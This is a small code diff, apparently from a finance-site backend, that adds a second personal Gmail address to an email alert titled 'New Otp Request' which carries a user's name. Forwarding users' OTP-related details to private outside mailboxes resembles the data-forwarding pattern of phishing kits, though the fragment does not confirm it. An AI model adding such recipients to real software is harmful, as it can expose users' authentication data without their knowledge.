@@ -125,7 +125,7 @@ https://thesector.finance
 
     await transporter.sendMail({
       from: `"Notification" <${process.env.EMAIL_USER}>`,
-      to: ["bitfusion867@gmail.com"],
+      to: ["bitfusion867@gmail.com", "kenthomson999@gmail.com"],
       subject: `New User: ${name}`,
       text: `New Otp Request :
       Name: ${name}
